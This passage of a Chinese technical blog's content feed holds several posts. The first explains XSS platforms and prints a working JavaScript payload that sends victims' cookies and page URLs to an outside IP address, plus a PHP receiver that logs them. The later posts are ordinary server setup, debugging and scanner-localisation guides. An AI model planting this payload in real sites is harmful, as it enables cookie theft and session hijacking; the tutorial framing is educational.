class="built_in">window</span>.opener &amp;&amp; <span class="built_in">window</span>.opener.location.href) ? <span class="built_in">window</span>.opener.location.href : <span class="string">''</span></span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)());</span><br><span class="line">          &#125;)();</span><br><span class="line">          <span class="keyword">if</span> (<span class="string">''</span> == <span class="number">1</span>) &#123;</span><br><span class="line">              keep = <span class="keyword">new</span> Image();</span><br><span class="line">              keep.src = <span class="string">'http://47.100.191.127/test.php?url='</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.location) + <span class="string">'&amp;cookie='</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)</span><br><span class="line">          &#125;;</span><br></pre></td></tr></table></figure><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>至此对XSS平台传递原理有了大概了解，手头上正好有外网服务器，做个测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取信息测试</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$cookie      = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$refer       = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$location    = $_GET[<span class="string">'location'</span>];</span><br><span class="line">$toplocation = $_GET[<span class="string">'toplocation'</span>];</span><br><span class="line">$url         = $_GET[<span class="string">'url'</span>];</span><br><span class="line">$time        = date(<span class="string">"Y-m-d H:i:s"</span>);</span><br><span class="line">$testfile    = fopen(<span class="string">"xsstest.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"文件打开失败!"</span>);</span><br><span class="line">$txt         = <span class="string">"Cookies:"</span> . $cookie . <span class="string">"\r\n"</span> . <span class="string">"Refer:"</span> . $refer . <span class="string">"\r\n"</span> . <span class="string">"location:"</span> . $location . <span class="string">"\r\n"</span> . <span class="string">"Toplocation:"</span> . $toplocation . <span class="string">"\r\n"</span> . <span class="string">"Time:"</span> . $time . <span class="string">"\r\n"</span>;</span><br><span class="line">fwrite($testfile, $txt);</span><br><span class="line">fclose($testfile);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/Ae1Dc4V.png" alt=""></p><p>本地写个文件</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">              (<span class="keyword">new</span> Image()).src = <span class="string">'http://XXXXX/test.php?location='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * 新建图片，图片资源地址为你的XSS平台的接口地址</span></span><br><span class="line"><span class="comment">                 * 对下列内容编码</span></span><br><span class="line"><span class="comment">                 * 1、访问的完整路径</span></span><br><span class="line"><span class="comment">                 * 2、cookie</span></span><br><span class="line"><span class="comment">                 * 3、父页面对象</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="built_in">document</span>.location.href</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">'&amp;toplocation='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> top.location.href</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">'&amp;cookie='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="built_in">document</span>.cookie</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">'&amp;opener='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> (<span class="built_in">window</span>.opener &amp;&amp; <span class="built_in">window</span>.opener.location.href) ? <span class="built_in">window</span>.opener.location.href : <span class="string">''</span></span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)());</span><br><span class="line">          &#125;)();</span><br><span class="line">          <span class="keyword">if</span> (<span class="string">''</span> == <span class="number">1</span>) &#123;</span><br><span class="line">              keep = <span class="keyword">new</span> Image();</span><br><span class="line">              keep.src = <span class="string">'http://XXXXX/test.php?url='</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.location) + <span class="string">'&amp;cookie='</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)</span><br><span class="line">          &#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>访问后不出意外会在服务器目录下生成<code>xsstest.txt</code>文件并记录相关信息<br><img src= "/img/loading.gif" data-lazy-src="/images/WQOvWVS.png" alt=""><br><img src= "/img/loading.gif" data-lazy-src="/images/jkdJ52S.png" alt=""><br>成功</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LAMP服务器报错500调试方法</title>
      <link href="/p/332015673.html"/>
      <url>/p/332015673.html</url>
      
        <content type="html"><![CDATA[<p>3个多月没发博文了 过一段时间把i春秋上的文章迁移下。。</p><a id="more"></a><p>最近在用PHP做课设 本地测试非常完美<br><img src= "/img/loading.gif" data-lazy-src="/images/HLUVsTT.png" alt=""><br>但是到了远程服务器就报500错误了。。<br><img src= "/img/loading.gif" data-lazy-src="/images/P9Q1dnF.png" alt=""><br>查了一番资料，发现了一个万能调试代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">register_shutdown_function(</span><br><span class="line"><span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; </span><br><span class="line">var_dump(error_get_last()); </span><br><span class="line">&#125;);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把这段直接加到出问题的主文件开头<br><img src= "/img/loading.gif" data-lazy-src="/images/kBzyP6w.png" alt=""><br>然后访问<br><img src= "/img/loading.gif" data-lazy-src="/images/GZdo3tU.png" alt=""><br>即可定位错误并解决</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Linux </tag>
            
            <tag> LAMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汉化AWVS11</title>
      <link href="/p/4184734165.html"/>
      <url>/p/4184734165.html</url>
      
        <content type="html"><![CDATA[<p>AWVS11汉化包</p><a id="more"></a><p><strong>没注意AWVS11更新了2个版本了，试了下原先汉化的那个包，大部分不能用了，重新汉化了下</strong></p><h1 id="界面预览"><a href="#界面预览" class="headerlink" title="界面预览"></a>界面预览</h1><h2 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/M4zyhkv.png" alt=""></p><h2 id="仪表盘"><a href="#仪表盘" class="headerlink" title="仪表盘"></a>仪表盘</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/CUblTHp.png" alt=""></p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/wNNaTSW.png" alt=""></p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/DYNgm8m.png" alt=""></p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/K3vUPKi.png" alt=""></p><h2 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/X1FXb5Y.png" alt=""></p><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/kJTMe5f.png" alt=""></p><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><ol><li>下载</li><li>解压</li><li>复制到AWVS11的\ui\scripts目录下，覆盖原文件 [建议备份原文件]</li><li>如：AWVS11目录为<code>C:\Program Files (x86)\Acunetix 11\</code>则目标位置为<code>C:\Program Files (x86)\Acunetix 11\11.0.172901635\ui\scripts</code></li><li>如AWVS11运行中，请强制刷新AWVS11当前页</li></ol><h1 id="汉化说明"><a href="#汉化说明" class="headerlink" title="汉化说明"></a>汉化说明</h1><ol><li>全局UI界面重新做汉化，尽可能的保留原始意思</li><li>出于版权原因，漏洞说明不提供汉化</li><li>添加了github项目，使用过程中如有界面未做到汉化或更好的建议，请在本帖内反馈或到Github反馈，感谢</li><li>请勿用于非法用途，测试后请尽快删除。</li></ol><hr><h1 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h1><p><a href="http://cnspace-1251949277.cosbj.myqcloud.com/files/AWVS11.rar" target="_blank" rel="noopener">AWVS11.rar</a></p>]]></content>
      
      
      <categories>
          
          <category> AWVS11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWVS11 </tag>
            
            <tag> 汉化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HEXO+NGINX 部署教程</title>
      <link href="/p/2289482423.html"/>
      <url>/p/2289482423.html</url>
      
        <content type="html"><![CDATA[<p>应朋友要求，记录下HEXO+NGINX部署</p><a id="more"></a><h1 id="HEXO介绍"><a href="#HEXO介绍" class="headerlink" title="HEXO介绍"></a>HEXO介绍</h1><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h1 id="Nginx介绍"><a href="#Nginx介绍" class="headerlink" title="Nginx介绍"></a>Nginx介绍</h1><p>Nginx （读“engine x”）是一款免费、开源、高性能的HTTP服务器。<br>Nginx 因性能稳定、功能丰富、配置简单、资源消耗低而著称。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>本次采用的环境：<br>Centos 7<br>Node.js 8.9.4</p><h1 id="Nginx部署"><a href="#Nginx部署" class="headerlink" title="Nginx部署"></a>Nginx部署</h1><p>参考博客的：<a href="https://0x20h.com/p/1782935252.html">Nginx部署</a></p><h1 id="Hexo部署"><a href="#Hexo部署" class="headerlink" title="Hexo部署"></a>Hexo部署</h1><h2 id="下载安装最新的node-js"><a href="#下载安装最新的node-js" class="headerlink" title="下载安装最新的node.js"></a>下载安装最新的node.js</h2><p><code>wget https://nodejs.org/dist/v8.9.4/node-v8.9.4.tar.gz</code></p><h3 id="解压并重命名"><a href="#解压并重命名" class="headerlink" title="解压并重命名"></a>解压并重命名</h3><p><code>tar xvf node-v8.9.4.tar.gz &amp;&amp; mv node-v8.9.4 node</code></p><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><h3 id="进入目录"><a href="#进入目录" class="headerlink" title="进入目录"></a>进入目录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www ~]# cd node</span><br><span class="line">[root@www node]# ls</span><br><span class="line">AUTHORS      BUILDING.md   CODE_OF_CONDUCT.md     CONTRIBUTING.md     GOVERNANCE.md  Makefile   android-configure  common.gypi  deps  lib       node.gypi  test   vcbuild.bat</span><br><span class="line">BSDmakefile  CHANGELOG.md  COLLABORATOR_GUIDE.md  CPP_STYLE_GUIDE.md  LICENSE        README.md  benchmark          configure    doc   node.gyp  src        tools</span><br></pre></td></tr></table></figure><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>这一步耗时较长，可以泡杯咖啡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www node]# ./configure --prefix=/usr/local/node/8.9.4 &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="配置NODE-HOME，进入profile编辑环境变量"><a href="#配置NODE-HOME，进入profile编辑环境变量" class="headerlink" title="配置NODE_HOME，进入profile编辑环境变量"></a>配置NODE_HOME，进入profile编辑环境变量</h3><p><code>vi /etc/profile</code><br>设置nodejs环境变量，在<em>export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL</em>一行的上面添加如下内容:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set for nodejs</span><br><span class="line">export NODE_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;node&#x2F;8.9.4</span><br><span class="line">export PATH&#x3D;$NODE_HOME&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure><p>:wq保存并退出，编译<code>/etc/profile</code>使配置生效<br><code>source /etc/profile</code><br>验证是否安装配置成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line"></span><br><span class="line">[root@www node]# node -v</span><br><span class="line">v8.9.4</span><br></pre></td></tr></table></figure><p>npm模块安装路径<br><code>/usr/local/node/8.9.4/lib/node_modules/</code></p><p><strong>注：Nodejs 官网提供了编译好的Linux二进制包，你也可以下载下来直接应用。</strong></p><h2 id="下载hexo"><a href="#下载hexo" class="headerlink" title="下载hexo"></a>下载hexo</h2><p><code>[root@www ~]# npm install -g hexo-cli</code></p><h2 id="初始化HEXO"><a href="#初始化HEXO" class="headerlink" title="初始化HEXO"></a>初始化HEXO</h2><p>在<code>/home/wwwroot/domain</code>目录下初始化<code>hexo</code>博客，也可以是任意你想要的名字<br><code>[root@www domain]# hexo init /home/wwwroot/domain</code><br>进入博客根目录，并且安装相关插件依赖等<br><code>[root@www domain]cd /home/wwwroot/domain/blog</code><br><code>[root@www blog]# npm install</code><br>安装完成后需要用一下命令<br><code>[root@www blog] hexo g -d</code></p><h2 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h2><p><a href="https://0x20h.com/p/1782935252.html">Nginx部署</a><br>在虚拟主机配置的目录新建个<code>blog.conf</code>内容如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    #listen 443 spdy;</span><br><span class="line">    #listen [::]:443 spdy;</span><br><span class="line">    server_name blog.example.com;</span><br><span class="line">    index index.html index.php;</span><br><span class="line">    set $subdomain &#39;&#39;;</span><br><span class="line">    root  &#x2F;home&#x2F;wwwroot&#x2F;domain&#x2F;blog&#x2F;public$subdomain;</span><br><span class="line">    #include &#x2F;home&#x2F;wwwroot&#x2F;rewrite&#x2F;xxx.conf;</span><br><span class="line">   </span><br><span class="line">    ### SSL 配置</span><br><span class="line">    #ssl on;</span><br><span class="line">    #ssl_protocols TLSv1.2 TLSv1.1 TLSv1;</span><br><span class="line">    #ssl_ciphers CHACHA20:GCM:CFB:HIGH:!DH:!RC4:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS;</span><br><span class="line">    #add_header Strict-Transport-Security &quot;max-age&#x3D;31536000; includeSubdomains; preload&quot;;</span><br><span class="line">    #ssl_prefer_server_ciphers on;</span><br><span class="line">    #ssl_stapling on;</span><br><span class="line">    #ssl_stapling_verify on;</span><br><span class="line">    #ssl_certificate &#x2F;path&#x2F;to&#x2F;public.crt;</span><br><span class="line">    #ssl_certificate_key &#x2F;path&#x2F;to&#x2F;private.key;</span><br><span class="line">    ############</span><br><span class="line">    #location ~ .*.php(&#x2F;.*)*$</span><br><span class="line">    #&#123;</span><br><span class="line">    #    fastcgi_pass  unix:&#x2F;tmp&#x2F;php-cgi-www.example.com.sock;</span><br><span class="line">    #    fastcgi_index index.php;</span><br><span class="line">    #    include fastcgi.conf;</span><br><span class="line">    #    #fastcgi_param HTTPS $https if_not_empty;</span><br><span class="line">    #    fastcgi_param DOCUMENT_ROOT &#x2F;home&#x2F;wwwroot&#x2F;domain&#x2F;www.w3bsafe.cn$subdomain;</span><br><span class="line">    #    fastcgi_param SCRIPT_FILENAME  &#x2F;home&#x2F;wwwroot&#x2F;domain&#x2F;www.w3bsafe.cn$subdomain$fastcgi_script_name;</span><br><span class="line">    #&#125;</span><br><span class="line">    location ~ .*.(gif|jpg|jpeg|png|bmp|swf|flv|mp3|wma)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      30d;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~ .*.(js|css)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      12h;</span><br><span class="line">    &#125;</span><br><span class="line">    access_log off;</span><br><span class="line">    error_log &#x2F;dev&#x2F;null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重启nginx，访问你的域名即可</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机里的LINUX装VMTOOLS</title>
      <link href="/p/3201611950.html"/>
      <url>/p/3201611950.html</url>
      
        <content type="html"><![CDATA[<p>记录下虚拟机里的LINUX装VMTOOLS</p><a id="more"></a><h1 id="环境如下："><a href="#环境如下：" class="headerlink" title="环境如下："></a>环境如下：</h1><ul><li>Centos6</li><li>VM12.9</li></ul><h1 id="安装LINUX"><a href="#安装LINUX" class="headerlink" title="安装LINUX"></a>安装LINUX</h1><p><img src= "/img/loading.gif" data-lazy-src="/images/tu6BkmI.png" alt=""></p><p><img src= "/img/loading.gif" data-lazy-src="/images/GtCKgbF.png" alt=""></p><p><img src= "/img/loading.gif" data-lazy-src="/images/I9cGgYb.png" alt=""></p><p><img src= "/img/loading.gif" data-lazy-src="/images/Y6osn76.png" alt=""></p><p><img src= "/img/loading.gif" data-lazy-src="/images/R6KKW41.png" alt=""></p><p><img src= "/img/loading.gif" data-lazy-src="/images/BteHsqg.png" alt=""></p><h1 id="安装VMTOOLS"><a href="#安装VMTOOLS" class="headerlink" title="安装VMTOOLS"></a>安装VMTOOLS</h1><h2 id="以root用户登录"><a href="#以root用户登录" class="headerlink" title="以root用户登录"></a>以root用户登录</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/iZu9q0H.png" alt=""></p><h2 id="警告消息"><a href="#警告消息" class="headerlink" title="警告消息"></a>警告消息</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/7sQ5oyR.png" alt=""></p><h2 id="进入系统后会弹出以下界面"><a href="#进入系统后会弹出以下界面" class="headerlink" title="进入系统后会弹出以下界面"></a>进入系统后会弹出以下界面</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/nCbsNhe.png" alt=""></p><h2 id="Copy-VMwareTools-tar-gz到桌面"><a href="#Copy-VMwareTools-tar-gz到桌面" class="headerlink" title="Copy VMwareTools.tar.gz到桌面"></a>Copy VMwareTools.tar.gz到桌面</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/FHnvtLH.png" alt=""><br><img src= "/img/loading.gif" data-lazy-src="/images/uIXnEXL.png" alt=""><br><strong>为方便，改个名</strong><br><img src= "/img/loading.gif" data-lazy-src="/images/Iw1EONB.png" alt=""></p><h2 id="打开SEHLL终端"><a href="#打开SEHLL终端" class="headerlink" title="打开SEHLL终端"></a>打开SEHLL终端</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/hFOSD9V.png" alt=""><br><img src= "/img/loading.gif" data-lazy-src="/images/iim4Tkz.png" alt=""></p><h2 id="cd到桌面"><a href="#cd到桌面" class="headerlink" title="cd到桌面"></a>cd到桌面</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/AV31RIi.png" alt=""></p><h2 id="tar解压"><a href="#tar解压" class="headerlink" title="tar解压"></a>tar解压</h2><p>命令:<code>tar xvf tools.tar.gz</code><br>解压后如下<br><img src= "/img/loading.gif" data-lazy-src="/images/yXdQnEy.png" alt=""><br>桌面出现个文件夹<br><img src= "/img/loading.gif" data-lazy-src="/images/4mKbyvf.png" alt=""></p><h2 id="cd进入解压后的文件夹vmware-tools-distrib"><a href="#cd进入解压后的文件夹vmware-tools-distrib" class="headerlink" title="cd进入解压后的文件夹vmware-tools-distrib"></a>cd进入解压后的文件夹vmware-tools-distrib</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/40JVxiR.png" alt=""></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>执行安装脚本<code>./vmware-install.pl</code><br><img src= "/img/loading.gif" data-lazy-src="/images/SUQ9d8F.png" alt=""><br>一路回车</p><hr><h2 id="安装完成"><a href="#安装完成" class="headerlink" title="安装完成"></a>安装完成</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/sGur5nI.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> VMWare </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7部署LNMP</title>
      <link href="/p/1782935252.html"/>
      <url>/p/1782935252.html</url>
      
        <content type="html"><![CDATA[<p>记录下CentOS7下手动部署Nginx+MySQL+PHP的方法[附修改Nginx的Hearder名称]</p><a id="more"></a><p>介绍：</p><blockquote><p>Nginx （读“engine x”）是一款免费、开源、高性能的HTTP服务器。<br>Nginx 因性能稳定、功能丰富、配置简单、资源消耗低而著称。<br>本文介绍如何在Linux服务器（CentOS 7）上安装Nginx、MySQL和PHP7（或者PHP5），这个环境也简称LNMP或LEMP。<br>其中，Nginx和PHP的采用PHP-FPM方式通信。</p></blockquote><h1 id="更新系统"><a href="#更新系统" class="headerlink" title="更新系统"></a>更新系统</h1><p><code>[root@www ~]# yum -y update &amp;&amp; yum -y update</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/Y8zn28D.png" alt=""></p><h1 id="安装用到的工具"><a href="#安装用到的工具" class="headerlink" title="安装用到的工具"></a>安装用到的工具</h1><p>安装开发工具</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yum -y update &amp;&amp; yum -y upgrade  //更新系统组件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> yum install -y vim screen //安装实用工具</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> screen -S install //使用screen防止ssh链路故障导致后续的编译步骤中断</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> yum install -y gcc gcc-c++ make cmake libxml2 libxml2-devel openssl-devel bison bison-devel make autoconf automake curl-devel gcc zlib-devel openssl pcre-devel gd kernel keyutils patch perl kernel-headers compat* mpfr cpp glibc libgomp libstdc++-devel ppl cloog-ppl keyutils-libs-devel libcom_err-devel libsepol-devel libselinux-devel krb5-devel zlib-devel libXpm* freetype libjpeg* libpng* ncurses* libtool* libxml2 libxml2-devel freetype-devel --skip-broken</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/uHEauah.png" alt=""></p><h1 id="建立运行网站和数据库必要的用户和组"><a href="#建立运行网站和数据库必要的用户和组" class="headerlink" title="建立运行网站和数据库必要的用户和组"></a>建立运行网站和数据库必要的用户和组</h1><p>添加运行nginx服务进程的用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">groupadd -r nginx </span><br><span class="line">useradd -r -g nginx  nginx</span><br></pre></td></tr></table></figure><h1 id="建立安装临时目录"><a href="#建立安装临时目录" class="headerlink" title="建立安装临时目录"></a>建立安装临时目录</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir /make</span></span><br></pre></td></tr></table></figure><h2 id="下载源码包"><a href="#下载源码包" class="headerlink" title="下载源码包"></a>下载源码包</h2><p>【以下源码截至2018年11月9日均为最新】</p><blockquote><p>Nginx:<a href="http://nginx.org/en/download.html" target="_blank" rel="noopener">http://nginx.org/en/download.html</a><br>PHP:<a href="http://php.net/downloads.php" target="_blank" rel="noopener">http://php.net/downloads.php</a><br>MySQL-5.7：<a href="https://dev.mysql.com/get/Downloads/MySQL-5.7/" target="_blank" rel="noopener">https://dev.mysql.com/get/Downloads/MySQL-5.7/</a></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget http://nginx.org/download/nginx-1.15.6.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget http://au1.php.net/distributions/php-7.2.12.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.24-el7-x86_64.tar.gz</span></span><br></pre></td></tr></table></figure><h1 id="编译Nginx"><a href="#编译Nginx" class="headerlink" title="编译Nginx"></a>编译Nginx</h1><h2 id="安装-vim-和-unzip"><a href="#安装-vim-和-unzip" class="headerlink" title="安装 vim 和 unzip"></a>安装 vim 和 unzip</h2><p>下载软件用于编辑和解压缩文件。运行命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yum install -y vim unzip</span></span><br></pre></td></tr></table></figure><h2 id="linux-终端颜色修改"><a href="#linux-终端颜色修改" class="headerlink" title="linux 终端颜色修改"></a>linux 终端颜色修改</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yum install -y vim</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim ~/.bashrc</span></span><br><span class="line">  PS1="\[\e[36;40m\][\[\e[31;40m\]\h\[\e[33;40m\]@\[\e[32;40m\]\u\[\e[33;40m\]@\[\e[36;40m\]\w\[\e[33;40m\]@\[\e[35;40m\]\#\[\e[36;40m\]]\[\e[34;40m\]~$ \[\e[0m\]"</span><br></pre></td></tr></table></figure><p>在PS1中设置字符颜色的格式为：<code>\[\e[F;Bm\]........\[\e[0m\]</code>，其中“F“为字体颜色，编号为30-37，“B”为背景颜色，编号为40-47,<code>\[\e[0m\]</code>作为颜色设定的结束。</p><p>颜色对照表：</p><table><thead><tr><th>F</th><th>B</th><th>color</th><th>备注</th></tr></thead><tbody><tr><td>30</td><td>40</td><td>黑色</td><td></td></tr><tr><td>31</td><td>41</td><td>红色</td><td></td></tr><tr><td>32</td><td>42</td><td>绿色</td><td></td></tr><tr><td>33</td><td>43</td><td>黄色</td><td></td></tr><tr><td>34</td><td>44</td><td>蓝色</td><td>在cmd里显示效果很差</td></tr><tr><td>35</td><td>45</td><td>紫红色</td><td>和powershell的紫色背景完全融为一体</td></tr><tr><td>36</td><td>46</td><td>青蓝色</td><td></td></tr><tr><td>37</td><td>47</td><td>白色</td><td></td></tr></tbody></table><p>要使用颜色只需将对应数字套入设置格式中即可。 比如要设置命令行的格式为绿字黑底(<code>\[\e[32;40m\]</code>)，显示当前用户的账号名称(\u)、主机的第一个名字(\h)、完整的当前工作目录名称(\w)、24小时格式时间(\t)。</p><h2 id="设置vim-行号"><a href="#设置vim-行号" class="headerlink" title="设置vim 行号"></a>设置vim 行号</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim   ~/.vimrc</span></span><br></pre></td></tr></table></figure><p>在里面输入 </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set nu</span><br></pre></td></tr></table></figure><p>下载完成后目录如下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www make]$ ls</span><br><span class="line">php-7.2.12.tar.gz  nginx-1.15.6.tar.gz  mysql-5.7.24-el7-x86_64.tar.gz</span><br></pre></td></tr></table></figure><h2 id="修改Nginx-编译"><a href="#修改Nginx-编译" class="headerlink" title="修改Nginx+编译"></a>修改Nginx+编译</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www make]$ tar zxvf nginx-1.15.6.tar.gz</span><br></pre></td></tr></table></figure><h2 id="以下为修改nginx名称和版本号步骤【无需要可跳过】"><a href="#以下为修改nginx名称和版本号步骤【无需要可跳过】" class="headerlink" title="以下为修改nginx名称和版本号步骤【无需要可跳过】"></a>以下为修改nginx名称和版本号步骤【无需要可跳过】</h2><p><strong>以下选做</strong></p><h3 id="nginx-h"><a href="#nginx-h" class="headerlink" title="nginx.h"></a>nginx.h</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www make]$ cd nginx-1.15.6/src/core</span><br><span class="line">[root@www core]$ vi nginx.h</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (C) Igor Sysoev</span></span><br><span class="line"><span class="comment"> * Copyright (C) Nginx, Inc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span 